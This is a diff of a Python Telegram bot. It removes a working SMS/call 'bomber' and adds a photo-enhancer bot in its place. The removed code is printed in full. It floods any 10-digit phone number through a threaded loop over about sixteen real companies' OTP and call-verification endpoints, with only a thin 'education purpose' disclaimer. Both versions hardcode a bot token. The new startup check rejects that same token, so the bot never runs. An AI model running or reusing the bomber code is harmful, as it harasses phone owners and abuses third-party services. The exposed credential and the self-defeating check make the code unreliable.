@@ -1,209 +1,226 @@
+import os
 import logging
-import threading
-import time
-import requests
-from concurrent.futures import ThreadPoolExecutor
-from telegram import Update
-from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler
-from flask import Flask
+from pathlib import Path
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import (
+    Application,
+    CommandHandler,
+    MessageHandler,
+    CallbackQueryHandler,
+    ContextTypes,
+    filters,
+)
+from PIL import Image, ImageEnhance, ImageFilter, ImageOps
+import cv2
+import numpy as np
 
-# ================= CONFIGURATION =================
-TELEGRAM_BOT_TOKEN = "9236973341:AAHsDn5OQ_fyq1gMLGjiUoC07ZXrHknrb_s"
-CHANNEL_SIGNATURE = "OWER OFF SURAJ BHAI"
-# =================================================
+# ====================== TOKEN YAHAN DALO ======================
+BOT_TOKEN = "9236973341:AAHsDn5OQ_fyq1gMLGjiUoC07ZXrHknrb_s"   # ← BotFather se token yahan paste karo
+# =============================================================
 
-# Logging setup
 logging.basicConfig(
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
     level=logging.INFO
 )
 logger = logging.getLogger(__name__)
 
-# Flask app for 24/7 Cloud Uptime (Render, Koyeb, etc.)
-flask_app = Flask('')
 
-@flask_app.route('/')
-def home():
-    return "🤖 Suraj Bhai High-Speed Bomber Bot is 24/7 Alive and Active!"
+# ====================== PHOTO ENHANCER CLASS ======================
+class UltraPhotoEnhancer:
+    def __init__(self, image_path: str):
+        self.original = Image.open(image_path).convert("RGB")
+        self.img = self.original.copy()
+        self.cv_img = cv2.cvtColor(np.array(self.img), cv2.COLOR_RGB2BGR)
 
-def run_flask():
-    flask_app.run(host='0.0.0.0', port=8080)
+    def restore_old_photo(self):
+        denoised = cv2.fastNlMeansDenoisingColored(self.cv_img, None, 8, 8, 7, 21)
+        lab = cv2.cvtColor(denoised, cv2.COLOR_BGR2LAB)
+        l, a, b = cv2.split(lab)
+        clahe = cv2.createCLAHE(clipLimit=2.8, tileGridSize=(8, 8))
+        l = clahe.apply(l)
+        lab = cv2.merge([l, a, b])
+        restored = cv2.cvtColor(lab, cv2.COLOR_LAB2BGR)
+        kernel = np.array([[0, -0.6, 0], [-0.6, 3.4, -0.6], [0, -0.6, 0]])
+        restored = cv2.filter2D(restored, -1, kernel)
+        self.cv_img = restored
+        self.img = Image.fromarray(cv2.cvtColor(restored, cv2.COLOR_BGR2RGB))
+        return self
 
-# Global tracking variables for live stats & active targets tracking
-BOMBER_STATS = {
-    "total_requests_sent": 0,
-    "active_targets": 0
-}
+    def enhance_face_body_color(self, factor=1.25):
+        self.img = ImageEnhance.Color(self.img).enhance(factor)
+        self.img = ImageEnhance.Contrast(self.img).enhance(1.18)
+        self.img = ImageEnhance.Brightness(self.img).enhance(1.08)
+        return self
 
-# Dictionary to manage active bombing sessions per phone number
-active_bombing_sessions = {}
+    def enhance_clothes_detail(self):
+        self.img = ImageEnhance.Sharpness(self.img).enhance(1.65)
+        self.img = self.img.filter(ImageFilter.DETAIL)
+        self.img = self.img.filter(ImageFilter.EDGE_ENHANCE_MORE)
+        return self
 
-# List of APIs provided for request execution
-APIS = [
-    {"name": "FreeFire Bomber",   "url": lambda p, d: f"https://freefire-api.ct.ws/bomber4.php?phone={p}&duration={d}", "method": "GET",  "headers": {"User-Agent": "Mozilla/5.0"}},
-    {"name": "Call Bomber API",   "url": lambda p, d: f"https://call-bomber-50k3t8a6r-rohit-harshes-projects.vercel.app/bomb?number={p}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}},
-    {"name": "Bomberr API",       "url": lambda p, d: f"https://bomberr.onrender.com/num={p}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}},
-    {"name": "Lenskart",          "url": lambda p, d: "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phoneCode":"+91","telephone":"{p}"}}'},
-    {"name": "Hungama",           "url": lambda p, d: "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un"}}'},
-    {"name": "Meru Cab",          "url": lambda p, d: "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"mobile_number={p}"},
-    {"name": "Dayco India",       "url": lambda p, d: "https://ekyc.daycoindia.com/api/nscript_functions.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"api=send_otp&mob={p}"},
-    {"name": "NoBroker",          "url": lambda p, d: "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"phone={p}&countryCode=IN"},
-    {"name": "ShipRocket",        "url": lambda p, d: "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNumber":"{p}"}}'},
-    {"name": "PenPencil",         "url": lambda p, d: "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'},
-    {"name": "1mg",               "url": lambda p, d: "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"number":"{p}","otp_on_call":true}}'},
-    {"name": "KPN Fresh",         "url": lambda p, d: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"phone_number":{{"number":"{p}","country_code":"+91"}}}}'},
-    {"name": "Servetel",          "url": lambda p, d: "https://api.servetel.in/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"mobile_number={p}"},
-    {"name": "Swiggy Call",       "url": lambda p, d: "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
-    {"name": "Tata Capital",      "url": lambda p, d: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
-    {"name": "Doubtnut",          "url": lambda p, d: "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"phone_number":"{p}","language":"en"}}'},
-]
+    def cinematic_look(self, intensity=0.75):
+        img = np.array(self.img).astype(np.float32) / 255.0
+        r, g, b = img[:, :, 0], img[:, :, 1], img[:, :, 2]
+        r = np.clip(r * 1.05 + 0.02, 0, 1)
+        g = np.clip(g * 0.98, 0, 1)
+        b = np.clip(b * 1.08 - 0.015, 0, 1)
+        rows, cols = img.shape[:2]
+        X = np.linspace(-1, 1, cols)
+        Y = np.linspace(-1, 1, rows)
+        X, Y = np.meshgrid(X, Y)
+        vignette = 1 - (X**2 + Y**2) * 0.28 * intensity
+        vignette = np.clip(vignette, 0.55, 1.0)
+        cinematic = np.stack([r, g, b], axis=2) * vignette[:, :, np.newaxis]
+        self.img = Image.fromarray(np.clip(cinematic * 255, 0, 255).astype(np.uint8))
+        return self
 
-# /start command
+    def upscale(self, target="4k"):
+        w, h = self.img.size
+        sizes = {"1080p": (1920, 1080), "2k": (2560, 1440), "4k": (3840, 2160)}
+        new_w, new_h = sizes.get(target, (3840, 2160))
+        ratio = min(new_w / w, new_h / h)
+        new_size = (int(w * ratio), int(h * ratio))
+        self.img = self.img.resize(new_size, Image.Resampling.LANCZOS)
+        self.img = ImageEnhance.Sharpness(self.img).enhance(1.25)
+        return self
+
+    def clean_background(self, strength=0.6):
+        img = np.array(self.img)
+        blurred = cv2.bilateralFilter(img, 9, 55, 55)
+        result = cv2.addWeighted(img, 1 - strength * 0.4, blurred, strength * 0.4, 0)
+        self.img = Image.fromarray(result)
+        return self
+
+    def full_pipeline(self, mode="cinematic", resolution="4k"):
+        self.restore_old_photo()
+        self.enhance_face_body_color(1.22 if mode != "vintage" else 1.08)
+        self.enhance_clothes_detail()
+        self.clean_background(0.55)
+
+        if mode == "cinematic":
+            self.cinematic_look(0.8)
+        elif mode == "vintage":
+            self.img = ImageEnhance.Color(self.img).enhance(0.85)
+            self.img = ImageOps.autocontrast(self.img, cutoff=1)
+        elif mode == "ultra":
+            self.img = ImageEnhance.Color(self.img).enhance(1.35)
+            self.img = ImageEnhance.Sharpness(self.img).enhance(1.9)
+            self.cinematic_look(0.45)
+
+        self.upscale(resolution)
+        return self.img
+
+
+# ====================== BOT HANDLERS ======================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    welcome_msg = (
-        f"╔═══════════════════════════════════╗\n"
-        f"✨ **Aapka Swagat Hai Suraj Bhai Ke Bomber Bot Me** ✨\n"
-        f"╚═══════════════════════════════════╝\n\n"
-        f"⚠️ **CHETAVANI / WARNING:**\n"
-        f"Yeh bot sirf aur sirf **Education Purpose** aur security/stress testing ke liye banaya gaya hai.\n\n"
-        f"🚀 **Available Commands:**\n"
-        f"👉 `/bomb <phone_number>` - High-speed multi-threaded requests shuru karne ke liye.\n"
-        f"👉 `/stop <phone_number>` - Specific target number ki bombing rokne ke liye.\n"
-        f"👉 `/stats` - Live request delivery status check karne ke liye.\n\n"
-        f"👑 *Powered By:* {CHANNEL_SIGNATURE}"
+    text = (
+        "👋 **Ultra HD Photo Enhancer Bot**\n\n"
+        "Bas photo bhejo, main usko:\n"
+        "• Old / phati photo restore karunga\n"
+        "• Face + Body color HD banunga\n"
+        "• Kapde detail deep karunga\n"
+        "• Full Cinematic look dunga\n"
+        "• 1080p / 2K / 4K mein upscale karunga\n\n"
+        "Photo bhejne ke baad mode choose kar lena."
     )
-    await update.message.reply_text(welcome_msg, parse_mode="Markdown")
+    await update.message.reply_text(text, parse_mode="Markdown")
 
-# /stats command
-async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    stats_msg = (
-        f"📊 **Bomber Live Statistics**\n"
-        f"━━━━━━━━━━━━━━━━━━━\n"
-        f"🔄 Total Requests Sent: `{BOMBER_STATS['total_requests_sent']}`\n"
-        f"🎯 Active Targets in Queue: `{BOMBER_STATS['active_targets']}`\n"
-        f"⚡ Status: High-Speed Multi-Threaded Running\n"
-        f"👑 Powered By: {CHANNEL_SIGNATURE}"
-    )
-    await update.message.reply_text(stats_msg, parse_mode="Markdown")
 
-# Single API execution worker function
-def send_single_request(api, target_phone):
-    try:
-        url = api["url"](target_phone, "60")
-        headers = api["headers"]
-        
-        if api["method"] == "GET":
-            requests.get(url, headers=headers, timeout=2.5)
-        elif api["method"] == "POST":
-            data = api["data"](target_phone, "60")
-            requests.post(url, headers=headers, data=data, timeout=2.5)
-        
-        BOMBER_STATS["total_requests_sent"] += 1
-    except Exception:
-        pass
-
-# /bomb command handler with high speed ThreadPoolExecutor
-async def handle_bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not context.args:
-        await update.message.reply_text(
-            "❌ **Kripya target mobile number dein!**\n\n"
-            "📌 *Example:* `/bomb 9876543210`",
-            parse_mode="Markdown"
-        )
-        return
-    
-    target_phone = context.args[0].strip()
-    
-    if not target_phone.isdigit() or len(target_phone) != 10:
-        await update.message.reply_text(
-            "❌ **Galat Number!** Kripya 10 digit ka valid mobile number darj karein.\n"
-            "📌 *Example:* `/bomb 9876543210`",
-            parse_mode="Markdown"
-        )
-        return
-
-    if target_phone in active_bombing_sessions and active_bombing_sessions[target_phone]:
-        await update.message.reply_text(
-            f"⚠️ **Target `{target_phone}` par bombing pehle se hi chal rahi hai!**",
-            parse_mode="Markdown"
-        )
-        return
-
-    active_bombing_sessions[target_phone] = True
-    BOMBER_STATS["active_targets"] += 1
-    
+async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        f"🎯 **Target Number:** `{target_phone}`\n"
-        f"⚡ **Status:** Ultra High-Speed Multi-Threaded Bombing Started!\n"
-        f"🛑 *Rokne ke liye likhein:* `/stop {target_phone}`",
-        parse_mode="Markdown"
+        "Sirf photo bhejo.\n"
+        "Phir mode choose karo:\n"
+        "• Cinematic (recommended)\n"
+        "• Ultra Sharp\n"
+        "• Vintage Restore\n"
+        "• Natural"
     )
-    
-    # Run in background thread using ThreadPoolExecutor for high speed concurrent requests
-    threading.Thread(
-        target=run_threaded_bomber, 
-        args=(target_phone,)
-    ).start()
 
-def run_threaded_bomber(target_phone):
-    try:
-        # High speed parallel execution loop using larger max_workers for ultra speed
-        while active_bombing_sessions.get(target_phone, False):
-            with ThreadPoolExecutor(max_workers=20) as executor:
-                for api in APIS:
-                    if not active_bombing_sessions.get(target_phone, False):
-                        break
-                    executor.submit(send_single_request, api, target_phone)
-            
-            # Minimal pause for maximum request saturation
-            time.sleep(0.3)
-            
-    except Exception as e:
-        print(f"❌ Error in threaded loop for {target_phone}: {e}")
-    finally:
-        if active_bombing_sessions.get(target_phone, False):
-            active_bombing_sessions[target_phone] = False
-            BOMBER_STATS["active_targets"] -= 1
 
-# /stop command handler to terminate bombing for a specific number only
-async def handle_stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not context.args:
-        await update.message.reply_text(
-            "❌ **Kripya woh mobile number dein jise rokna hai!**\n\n"
-            "📌 *Example:* `/stop 9876543210`",
-            parse_mode="Markdown"
-        )
+async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    photo = update.message.photo[-1]
+    file = await context.bot.get_file(photo.file_id)
+
+    user_id = update.effective_user.id
+    input_path = f"temp_{user_id}_input.jpg"
+    await file.download_to_drive(input_path)
+
+    context.user_data["input_path"] = input_path
+
+    keyboard = [
+        [
+            InlineKeyboardButton("🎬 Cinematic 4K", callback_data="cinematic_4k"),
+            InlineKeyboardButton("⚡ Ultra 4K", callback_data="ultra_4k"),
+        ],
+        [
+            InlineKeyboardButton("📜 Vintage 4K", callback_data="vintage_4k"),
+            InlineKeyboardButton("🌿 Natural 4K", callback_data="natural_4k"),
+        ],
+        [
+            InlineKeyboardButton("🎬 Cinematic 1080p", callback_data="cinematic_1080p"),
+            InlineKeyboardButton("⚡ Ultra 1080p", callback_data="ultra_1080p"),
+        ],
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+
+    await update.message.reply_text(
+        "Photo mil gayi ✅\nAb mode choose karo:",
+        reply_markup=reply_markup
+    )
+
+
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+
+    data = query.data
+    mode, resolution = data.split("_")
+
+    input_path = context.user_data.get("input_path")
+    if not input_path or not Path(input_path).exists():
+        await query.edit_message_text("Pehle photo bhejo!")
         return
-    
-    target_phone = context.args[0].strip()
 
-    if target_phone in active_bombing_sessions and active_bombing_sessions[target_phone]:
-        active_bombing_sessions[target_phone] = False
-        BOMBER_STATS["active_targets"] = max(0, BOMBER_STATS["active_targets"] - 1)
-        await update.message.reply_text(
-            f"🛑 **SUCCESS:** Target `{target_phone}` ki bombing successfully rok di gayi hai!",
-            parse_mode="Markdown"
-        )
-    else:
-        await update.message.reply_text(
-            f"⚠️ **Is number (`{target_phone}`) par koi active bombing nahi chal rahi hai.**",
-            parse_mode="Markdown"
-        )
+    await query.edit_message_text(f"⏳ Processing... Mode: {mode.upper()} | {resolution.upper()}\nThoda time lagega...")
+
+    try:
+        enhancer = UltraPhotoEnhancer(input_path)
+        result = enhancer.full_pipeline(mode=mode, resolution=resolution)
+
+        output_path = f"temp_{query.from_user.id}_output.jpg"
+        result.save(output_path, quality=95)
+
+        with open(output_path, "rb") as f:
+            await context.bot.send_photo(
+                chat_id=query.message.chat_id,
+                photo=f,
+                caption=f"✅ Enhanced!\nMode: {mode.upper()} | Resolution: {resolution.upper()}"
+            )
+
+        # Cleanup
+        Path(input_path).unlink(missing_ok=True)
+        Path(output_path).unlink(missing_ok=True)
+
+    except Exception as e:
+        logger.error(e)
+        await query.edit_message_text(f"❌ Error: {str(e)}")
+
 
 def main():
-    flask_thread = threading.Thread(target=run_flask)
-    flask_thread.daemon = True
-    flask_thread.start()
+    if BOT_TOKEN == "9236973341:AAHsDn5OQ_fyq1gMLGjiUoC07ZXrHknrb_s":
+        print("❌ Pehle BOT_TOKEN set karo!")
+        return
 
-    app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()
+    app = Application.builder().token(BOT_TOKEN).build()
 
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("stats", stats_command))
-    app.add_handler(CommandHandler("bomb", handle_bomb_command))
-    app.add_handler(CommandHandler("stop", handle_stop_command))
+    app.add_handler(CommandHandler("help", help_command))
+    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
+    app.add_handler(CallbackQueryHandler(button_handler))
 
-    print(f"🤖 Suraj Bhai High-Speed Bomber Bot is up and running [Powered by {CHANNEL_SIGNATURE}]...")
-    app.run_polling()
+    print("Bot starting...")
+    app.run_polling(allowed_updates=Update.ALL_TYPES)
 
-if __name__ == '__main__':
+
+if __name__ == "__main__":
     main()
